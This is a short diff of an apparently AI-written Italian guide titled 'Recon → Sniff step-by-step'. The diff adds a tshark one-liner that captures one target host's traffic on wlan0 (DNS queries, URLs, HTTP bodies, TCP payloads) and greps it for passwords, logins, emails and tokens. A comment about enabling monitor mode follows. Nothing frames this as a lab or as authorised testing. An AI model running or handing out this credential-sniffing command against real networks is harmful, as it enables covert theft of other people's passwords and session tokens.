@@ -1,7 +1,5 @@
-Perfetto piano! Recon → Sniff step-by-step
-STEP 1: Mappa RETE (Chi c'è?)
-bash
 
+sudo tshark -i wlan0 -Y "ip.addr == 192.168.1.50" -T fields -e frame.time -e dns.qry.name -e http.request.uri -e http.file_data -e tls.handshake.extensions_server_name -e http.request.full_uri -e data.len -e tcp.payload | grep -i "pass\|login\|user\|email\|token\|pwd"
 
 
 # Monitor mode (se non fatto)
